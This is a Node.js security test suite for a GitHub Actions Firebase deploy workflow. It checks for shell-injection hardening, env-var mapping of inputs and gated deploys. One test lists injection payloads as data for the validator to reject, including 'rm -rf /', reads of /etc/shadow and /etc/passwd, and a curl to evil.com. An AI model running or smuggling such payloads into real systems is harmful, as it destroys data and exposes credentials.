import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import { validateHostingTarget } from '../verify-firebase-config.mjs';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const rootDir = path.resolve(__dirname, '../..');
const workflowPath = path.join(rootDir, '.github', 'workflows', 'deploy-hosting.yml');

describe('GitHub Actions Workflow Security & Shell Injection Hardening', () => {
  assert.ok(fs.existsSync(workflowPath), 'deploy-hosting.yml must exist');
  const workflowContent = fs.readFileSync(workflowPath, 'utf8');

  it('1. Ensures zero direct ${{ inputs.* }} interpolation inside any run: script block', () => {
    const lines = workflowContent.split('\n');
    let insideRunBlock = false;
    let runIndent = -1;
    const violations = [];

    for (let i = 0; i < lines.length; i++) {
      const line = lines[i];
      const trimmed = line.trim();

      // Check if entering a run block (single or multiline)
      if (trimmed.startsWith('run:')) {
        insideRunBlock = true;
        runIndent = line.search(/\S/);
        // Check single line run:
        if (line.includes('${{ inputs.')) {
          violations.push({ line: i + 1, content: line });
        }
        continue;
      }

      if (insideRunBlock) {
        const currentIndent = line.search(/\S/);
        // If non-empty line has indent less than or equal to run block indentation, run block ended
        if (trimmed.length > 0 && currentIndent <= runIndent) {
          insideRunBlock = false;
        } else {
          // Inside run block content
          if (line.includes('${{ inputs.')) {
            violations.push({ line: i + 1, content: line });
          }
        }
      }
    }

    assert.strictEqual(
      violations.length,
      0,
      `Detected direct \${{ inputs.* }} interpolation in run: script (CWE-78 exposure):\n` +
      violations.map(v => `  Line ${v.line}: ${v.content}`).join('\n')
    );
  });

  it('2. Enforces environment variables mapping for workflow dispatch inputs', () => {
    assert.ok(
      workflowContent.includes('INPUT_TARGET_SITE: ${{ inputs.target_site }}'),
      'Must pass inputs.target_site through env mapping INPUT_TARGET_SITE'
    );
    assert.ok(
      workflowContent.includes('INPUT_DRY_RUN: ${{ inputs.dry_run }}'),
      'Must pass inputs.dry_run through env mapping INPUT_DRY_RUN'
    );
    assert.ok(
      workflowContent.includes('TARGET_SITE="${INPUT_TARGET_SITE:-orderbhojan}"'),
      'Must safely read and default TARGET_SITE from quoted env var'
    );
    assert.ok(
      workflowContent.includes('DRY_RUN="${INPUT_DRY_RUN:-true}"'),
      'Must safely read and default DRY_RUN from quoted env var'
    );
    assert.ok(
      workflowContent.includes('"$GITHUB_STEP_SUMMARY"'),
      'Must quote GITHUB_STEP_SUMMARY in shell script'
    );
  });

  it('3. Restricts target_site to strict choice type with only "orderbhojan"', () => {
    // Check workflow_dispatch inputs structure
    assert.ok(
      workflowContent.includes("target_site:"),
      'Must define target_site input'
    );
    assert.ok(
      workflowContent.includes("type: choice"),
      'target_site must be restricted with type: choice'
    );
    assert.ok(
      workflowContent.includes("- 'orderbhojan'"),
      "target_site choice options must strictly contain only 'orderbhojan'"
    );
    assert.ok(
      workflowContent.includes("default: 'orderbhojan'"),
      "target_site must default to 'orderbhojan'"
    );
  });

  it('4. Rejects arbitrary strings and shell injection metacharacters via validateHostingTarget', () => {
    // Valid target
    const validRes = validateHostingTarget('orderbhojan');
    assert.strictEqual(validRes.valid, true);
    assert.strictEqual(validRes.target, 'orderbhojan');

    // Attack payloads - Shell command injection
    const maliciousPayloads = [
      'orderbhojan; rm -rf /',
      'orderbhojan && cat /etc/shadow',
      'orderbhojan | curl http://evil.com',
      '$(whoami)',
      '`id`',
      '> /tmp/exploit',
      'orderbhojan\nrm -rf /',
      'orderbhojan\r\nreboot',
      '"orderbhojan"',
      "'orderbhojan'",
      'orderbhojan; echo test',
      'orderbhojan$(cat /etc/passwd)',
      'orderbhojan`id`',
    ];

    for (const payload of maliciousPayloads) {
      const res = validateHostingTarget(payload);
      assert.strictEqual(
        res.valid,
        false,
        `Malicious payload must be rejected: ${payload}`
      );
    }

    // Invalid targets
    const unauthorizedTargets = [
      'bhojanos-prod',
      'admin',
      'staging',
      'orderbhojan-test',
      '',
      '   ',
      null,
      undefined,
      12345,
    ];

    for (const target of unauthorizedTargets) {
      const res = validateHostingTarget(target);
      assert.strictEqual(
        res.valid,
        false,
        `Unauthorized target must be rejected: ${target}`
      );
    }
  });

  it('5. Ensures gated deployment step cannot execute without explicit manual dispatch and main branch', () => {
    // Verify condition on Deploy to Firebase Hosting step
    const deployConditionMatch = workflowContent.match(
      /if:\s*github\.event_name\s*==\s*'workflow_dispatch'\s*&&\s*inputs\.dry_run\s*==\s*false\s*&&\s*github\.ref\s*==\s*'refs\/heads\/main'/
    );
    assert.ok(
      deployConditionMatch,
      'Deploy step must be guarded by: github.event_name == "workflow_dispatch" && inputs.dry_run == false && github.ref == "refs/heads/main"'
    );

    // Verify dry_run defaults to true
    assert.ok(
      workflowContent.includes('default: true'),
      'dry_run input must default to true'
    );

    // Verify hardcoded or strictly authorized target in deploy action
    assert.ok(
      workflowContent.includes('target: orderbhojan'),
      'Deploy action must explicitly target "orderbhojan"'
    );
  });
});
